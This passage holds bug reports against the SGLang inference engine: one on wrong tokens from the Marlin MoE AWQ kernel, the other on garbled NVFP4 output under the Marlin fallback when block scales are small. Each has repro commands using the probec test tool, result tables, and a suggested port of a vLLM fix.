wrong (12 of 96 runs in all), first going wrong anywhere from step 27 to step 209. Nothing else ran
concurrently. The same test with `--quantization moe_wna16` (Triton WNA16 MoE kernel) gave 0 of 32 runs wrong,
with one distinct output per prompt. The script is `tools/sgl_repeat.py` in the probec repo:
`python tools/sgl_repeat.py moe-awq --prompts 4 --reps 24` (add `--kw '{"quantization": "moe_wna16"}'` for the control).

The probe's MoE program checks routing: each expert tags the token, and the next layer compares the tags with
the expected route. At the failing steps it emits diagnostic tokens that name the expert whose contribution
was wrong; in one run these were experts 64, 65, 70, 75 and 92. A mismatch means an expert's output was
dropped, duplicated or altered for that token.

Radix cache, overlap scheduler and CUDA graphs each leave it in place, and so does a smaller KV pool. It
does not need batching either: with one request at a time, 11 of 192 requests still go wrong, each alone in
its decode steps. It follows the Marlin MoE kernel path. A dense AWQ checkpoint (dense Marlin) was exact in
our runs.

## Repro
```
git clone https://github.com/DiaaAj/probec && cd probec
pip install -e . "sglang[all]==0.5.22"
probec compile --like Qwen/Qwen3-30B-A3B --layers 2 --program moe --no-scale-check -o moe
probec quantize moe --format int4-awq --device cuda -o moe-awq
python tools/sgl_repeat.py moe-awq --prompts 4 --reps 24          # one request at a time: some repeats wrong
python tools/sgl_repeat.py moe-awq --prompts 2 --reps 16 --kw '{"attention_backend": "flashinfer", "quantization": "moe_wna16"}'   # exact
probec run moe-awq --engine sglang --matrix quick --only flashinfer/default --out results.jsonl   # the batched workload
probec report results.jsonl
```
probec's oracle knows every correct token, so a deviation is an engine error, not numerics. The report lists
the failing requests, their first wrong step, and for the MoE program the expert named by the diagnosis.

## Related
- #36822 (GPTQ Marlin MoE fails or produces NaNs with BF16 and tensor parallelism): the same kernel family, a different symptom.

## Environment
SGLang 0.5.22 (pip), RTX 3090 (SM86) on three hosts (drivers 595.84 and 595.91), CUDA 13.0 image.

items.title: [Bug] NVFP4 Marlin fallback (SM80-SM90) garbles every output when the block scales are small (vllm-project/vllm#34577 not ported)
items.body:
## Summary
On GPUs below Blackwell, SGLang runs NVFP4 (ModelOpt `quant_algo: NVFP4`) checkpoints through the Marlin
W4A16 kernel. `nvfp4_marlin_process_scales` (`python/sglang/srt/layers/quantization/marlin_utils_fp4.py`)
turns the E4M3 block scales into the "S0E5M3" form by computing `(scales * 2**7).view(int16) << 1`. That
assumes every non-zero scale satisfies `scale * 2**7 >= 2`, i.e. that the top bit of the result is set.

Checkpoints whose block scales are small violate that assumption, for example those exported with a
per-tensor `weight_scale_2` of 1. Their scales underflow in the BF16 dequantization and every output is
garbage.

vLLM had the same code and fixed it in vllm-project/vllm#34577 ("[Bugfix] Rescale NVFP4 weight scales to fix BF16 dequant
underflow", merged 2026-03-17). The fix rescales the block scales by a power of two so they satisfy the
assumption, and divides the global scale by the same factor; MoE layers share one factor across experts.
SGLang 0.5.22, and main at ba3fc94 (2026-10-18), still have the version without it.

## Observed (probec probe twins, greedy, 192 requests × 256 tokens)
| GPU | SGLang 0.5.22 | vLLM 0.31.0 |
|---|---|---|
| RTX 3090, Qwen3-0.6B twin, NVFP4 | 192/192 requests wrong from the first token (49,133 of 49,152 tokens) | exact |
| H100 PCIe, same checkpoint | 192/192 wrong (49,133 tokens, the identical count) | exact |
| RTX 3090, Qwen3-30B-A3B twin (MoE), NVFP4 | 192/192 wrong (49,135 tokens) | exact |
| RTX 3090, the same dense weights with ModelOpt-style scales (block scales near 448) | **exact** (0 of 49,152 tokens) | exact |

The two dense checkpoints hold identical dequantized weights and differ only in how the scale is split
between `weight_scale` (per 16 elements) and `weight_scale_2` (per tensor). Only the one with small
block scales fails, and only on the Marlin path: on a B200, where SGLang runs NVFP4 as W4A4 without
Marlin, both are exact.

vLLM before the fix fails the same way, with the same counts:

| vLLM on an RTX 3090 (Marlin) | probec's scales, dense | probec's scales, MoE | ModelOpt-style scales |
|---|---|---|---|
| 0.18.1 (before vllm-project/vllm#34577) | 49,133 of 49,152 tokens wrong | 49,135 wrong | exact |
| 0.19.0 (with vllm-project/vllm#34577) | exact | exact | exact |

The checkpoints are valid NVFP4: vLLM, which carries the fix, decodes them exactly. They differ from
typical ModelOpt exports only in their scale distribution. probec writes `weight_scale_2 = 1` with exact
power-of-two block scales (as small as 2^-7), so every scale is far below what the S0E5M3 trick tolerates.

## Repro
```
pip install "probec @ git+https://github.com/DiaaAj/probec" "sglang[all]==0.5.22"
probec compile --like Qwen/Qwen3-0.6B --no-scale-check -o twin
probec quantize twin --format nvfp4 --device cuda -o twin-nvfp4        # weight_scale_2 = 1
probec run twin-nvfp4 --engine sglang --matrix quick --only flashinfer/default --out results.jsonl
probec report results.jsonl
```
The control with the same dequantized weights and ModelOpt-style scales is
`probec quantize twin --format nvfp4 --nvfp4-scales modelopt --device cuda -o twin-nvfp4-mo`. probec's oracle
knows every correct token, so any deviation is an engine error, not numerics.

## Suggested fix
Port vllm-project/vllm#34577 (`_nvfp4_compute_scale_factor` in
`vllm/model_executor/layers/quantization/utils/marlin_utils_fp4.py`) to SGLang's `marlin_utils_fp4.py` and
its MoE caller.
